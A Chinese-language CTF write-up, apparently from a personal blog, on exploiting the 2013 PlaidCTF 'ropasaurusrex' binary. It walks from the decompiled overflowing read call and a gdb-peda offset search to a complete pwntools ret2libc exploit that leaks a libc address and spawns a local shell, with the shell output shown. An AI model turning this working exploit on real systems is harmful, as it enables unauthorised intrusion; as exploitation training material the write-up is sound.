---
title: 2013plaidctf-ropasaurusrex
date: 2018-03-17 19:30:56
tags: CTF

---

0x00 前言
-------

练练手~

0x01 程序分析
---------

    mask@mask-virtual-machine:~/CTF/2013plaidctfropasaurusrex$ ./ropasaurusrex 
    1
    WIN
    mask@mask-virtual-machine:~/CTF/2013plaidctfropasaurusrex$ ./ropasaurusrex 
    2
    WIN
    mask@mask-virtual-machine:~/CTF/2013plaidctfropasaurusrex$ ./ropasaurusrex 
    3
    WIN

<!--more-->

拉到IDA查看：

```
int __cdecl main()
{
  sub_80483F4();
  return write(1, "WIN\n", 4u);
}
```

跟进：

    ssize_t sub_80483F4()
    {
      char buf; // [sp+10h] [bp-88h]@1
    
      return read(0, &buf, 256u);
    }

很明显，read函数能够造成溢出


那么gdb开始调试分析：

先随机生成300个字符串吧

    mask@mask-virtual-machine:~/CTF/2013plaidctfropasaurusrex$ gdb ./ropasaurusrex 
    GNU gdb (Ubuntu 7.11.1-0ubuntu1~16.5) 7.11.1
    Copyright (C) 2016 Free Software Foundation, Inc.
    License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
    This is free software: you are free to change and redistribute it.
    There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
    and "show warranty" for details.
    This GDB was configured as "i686-linux-gnu".
    Type "show configuration" for configuration details.
    For bug reporting instructions, please see:
    <http://www.gnu.org/software/gdb/bugs/>.
    Find the GDB manual and other documentation resources online at:
    <http://www.gnu.org/software/gdb/documentation/>.
    For help, type "help".
    Type "apropos word" to search for commands related to "word"...
    Reading symbols from ./ropasaurusrex...(no debugging symbols found)...done.
    gdb-peda$ pattern create 300
    'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%'


运行时输入，然后断下来后计算偏移：
​    
```
gdb-peda$ r
Starting program: /home/mask/CTF/2013plaidctfropasaurusrex/ropasaurusrex 
AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%

Program received signal SIGSEGV, Segmentation fault.

[----------------------------------registers-----------------------------------]
EAX: 0x100 
EBX: 0x0 
ECX: 0xbfffef90 ("AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA"...)
EDX: 0x100 
ESI: 0xb7fba000 --> 0x1b1db0 
EDI: 0xb7fba000 --> 0x1b1db0 
EBP: 0x41514141 ('AAQA')
ESP: 0xbffff020 ("RAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%G")
EIP: 0x41416d41 ('AmAA')
EFLAGS: 0x10217 (CARRY PARITY ADJUST zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
Invalid $PC address: 0x41416d41
[------------------------------------stack-------------------------------------]
0000| 0xbffff020 ("RAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%G")
0004| 0xbffff024 ("AASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%G")
0008| 0xbffff028 ("ApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%G")
0012| 0xbffff02c ("TAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%G")
0016| 0xbffff030 ("AAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%G")
0020| 0xbffff034 ("ArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%G")
0024| 0xbffff038 ("VAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%G")
0028| 0xbffff03c ("AAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%G")
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x41416d41 in ?? ()
gdb-peda$ A%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%
Ambiguous command "A%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%": .
gdb-peda$ pattern offset 0x41416d41
1094806849 found at offset: 140
gdb-peda$ 
```


然后编写exp：
​    
```
from pwn import *

elf = ELF('./ropasaurusrex')

libc = ELF('/lib/i386-linux-gnu/libc.so.6')
bof = 0x80483f4 # the vulnerable function
buffer_len = 0x88

# p = remote(args.host, args.port)

p = process('./ropasaurusrex')

# p = remote('127.0.0.1',10002)

payload = ''
payload += 'A' * buffer_len
payload += 'AAAA' # saved ebp
payload += p32(elf.symbols['write'])
payload += p32(bof)
payload += p32(1) # stdout
payload += p32(elf.got['read'])
payload += p32(4) # len
p.send(payload)
resp = p.recvn(4)
read = u32(resp)
libc_base = read - libc.symbols['read']
payload = ''
payload += 'A' * buffer_len
payload += 'AAAA' 
payload += p32(libc_base + libc.symbols['system'])
payload += 'AAAA' 
payload += p32(libc_base + next(libc.search('/bin/sh')))
p.send(payload)

p.interactive()
```

执行：
```
mask@mask-virtual-machine:~/CTF/2013plaidctfropasaurusrex$ python exp.py 
[!] Pwntools does not support 32-bit Python.  Use a 64-bit release.
[+] Starting local process './ropasaurusrex': pid 13361
[*] '/lib/i386-linux-gnu/libc.so.6'
Arch: i386-32-little
RELRO:Partial RELRO
Stack:Canary found
NX:   NX enabled
PIE:  PIE enabled
[*] Switching to interactive mode
$ id
uid=1000(mask) gid=1000(mask) 组=1000(mask),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare)
$ whoami
mask
$  
```

